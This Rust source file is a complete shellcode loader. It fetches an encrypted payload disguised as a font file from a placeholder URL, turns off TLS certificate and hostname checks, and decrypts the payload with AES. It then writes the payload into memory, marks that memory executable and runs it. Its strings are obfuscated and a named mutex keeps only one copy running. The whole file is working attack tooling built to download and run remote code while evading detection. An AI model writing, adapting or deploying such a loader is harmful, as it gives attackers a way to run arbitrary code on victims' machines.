use std::process::exit;

//common use
use bytes::Bytes;
use region::{Protection, Allocation};

use named_lock::NamedLock;
use named_lock::Result;
use crypto::{ symmetriccipher, buffer, aes, blockmodes };
use crypto::buffer::{ ReadBuffer, WriteBuffer, BufferResult };

const URL: &str = "http://URL_REPLACE_ME/test.woff";

const AESKEY: &str = "AES_KEY";
const AESIV: &str  = "AES_IV";

const LOCKNAME: &str = "MUTEX_NAME";

fn decrypt(encrypted_data: &[u8]) -> Result<Vec<u8>, symmetriccipher::SymmetricCipherError> {
    let mut key = [0x42; 16];
    let mut iv = [0x24; 16];
    for (i, b) in obfstr::obfstr!(AESKEY).as_bytes().iter().enumerate() {
        key[i] = *b;
    }
    for (i, b) in obfstr::obfstr!(AESIV).as_bytes().iter().enumerate() {
        iv[i] = *b;
    }
    let mut decryptor = aes::cbc_decryptor(
        aes::KeySize::KeySize128,
        &key,
        &iv,
        blockmodes::PkcsPadding);
    // copied from rust-crypto sample
    let mut final_result = Vec::<u8>::new();
    let mut read_buffer = buffer::RefReadBuffer::new(encrypted_data);
    let mut buffer = [0; 4096];
    let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);

    loop {
        let result = decryptor.decrypt(&mut read_buffer, &mut write_buffer, true)?;
        final_result.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));
        match result {
            BufferResult::BufferUnderflow => break,
            BufferResult::BufferOverflow => { }
        }
    }
    Ok(final_result)
}

fn getscode(url: &str) -> Bytes {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()
        .unwrap();
    let res = match client.get(url).send() {
        Ok(res) => res,
        Err(_) => panic!("")
    };
    let rbytes = match res.bytes() {
        Ok(b) => b,
        Err(_) => panic!("")
    };
    // note, skip the first 16 bytes since they are the IV, might want to remove the IV from being in code and 
    // add it to the decypt function
    let pt = match decrypt(&rbytes[16..]) {
        Ok(p) => p,
        Err(e) => panic!("Error: {:?}", e)
    };

    let ptb = Bytes::from(pt);
    return ptb;
}

fn dne() -> Result<(), region::Error> {
    //download the payload
    let rbytes = getscode(obfstr::obfstr!(URL));
    // allocate and copy
    unsafe {
        //allocate
        let base_addr: Allocation = region::alloc(rbytes.len(), Protection::READ_WRITE)?;
        //copy
        std::ptr::copy(rbytes.as_ptr() as  _, base_addr.as_ptr::<u8>() as *mut u8, rbytes.len());
        // change to ex and cast
        let ep: extern "C" fn() -> i32 = {
            region::protect(base_addr.as_ptr::<u8>(), rbytes.len(), region::Protection::READ_EXECUTE)?;
            std::mem::transmute(base_addr.as_ptr::<u8>())
        };
        //run it
        ep();
        Ok(())
    }
}

fn main() {
    let lock = match NamedLock::create(obfstr::obfstr!(LOCKNAME)) {
        Ok(lock) => lock,
        Err(_) => exit(0)
    };
    let _guard = match lock.lock() {
        Ok(g) => g,
        Err(_) => exit(0)
    };
    let _ = dne();
}
